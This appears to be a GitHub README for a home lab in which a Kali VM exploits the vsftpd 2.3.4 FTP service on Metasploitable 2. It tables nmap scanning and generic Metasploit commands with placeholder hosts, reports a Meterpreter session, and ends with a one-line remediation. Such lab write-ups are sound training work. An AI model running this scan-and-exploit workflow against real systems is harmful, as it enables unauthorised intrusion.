# Metaploitable2-home-lab-
Objective : Exploit a vulnerable service in metasploitable 2 

Lab setup: VM kali and metasploitable2 

## Reconnaissance & Scanning

| Command | What it does |
|---------|--------------|
| `ipconfig` (Windows) / `ip addr` (Linux) | Show local IP configuration |
| `ping <ipaddr>` | Check if host is reachable |
| `nmap -sV <ipaddr>` | Scan target and detect service versions on open ports |
| `nmap -sV -p21 <ipaddr>` | Scan and detect service version on a specific port (e.g. port 21 = FTP) |

## Exploitation — Metasploit

| Command | What it does |
|---------|--------------|
| `msfconsole` | Launch the Metasploit Framework |
| `use <exploit/module path>` | Select an exploit or module to use |
| `info` | Show detailed info about the selected module |
| `show options` | Display parameters required for the module |
| `set RHOST <target IP>` | Set the target's IP address |
| `set LHOST <attacker IP>` | Set your (attacker) IP address |
| `run` or `exploit` | Execute the selected module |

<img width="956" height="494" alt="Screenshot 2026-07-24 151708" src="https://github.com/user-attachments/assets/4bef9547-df4e-4c65-a5e1-ce6c8b189b05" />

Exploit Outcome: The Metasploit module successfully exploited the vulnerable FTP service (vsftpd 2.3.4) on the Metasploitable target.A Meterpreter session was established from the attack machine , demonstrating successful remote code execution on the target system.

Remediation: 

Disable the vulnerable FTP Service on Port 21  

<img width="959" height="553" alt="Screenshot 2026-08-15 163204" src="https://github.com/user-attachments/assets/46f9b7a7-421b-4983-90f8-ac2a62be1dba" />



